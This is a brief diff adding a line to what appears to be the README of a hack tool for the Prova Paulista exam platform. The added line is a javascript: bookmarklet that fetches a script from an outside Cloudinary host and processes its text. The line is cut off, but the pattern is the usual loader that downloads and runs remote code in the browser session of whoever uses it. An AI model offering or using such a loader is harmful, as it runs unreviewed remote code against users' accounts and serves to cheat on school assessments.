@@ -1,3 +1,4 @@
+javascript:fetch("https://res.cloudinary.com/dctxcezsd/raw/upload/v1745882260/saladofuturov2.js").then(t=>t.text()).the
 # 🚀 HCK - PROVA PAULISTA 
 
 ## HCK - PROVA PAULISTA:
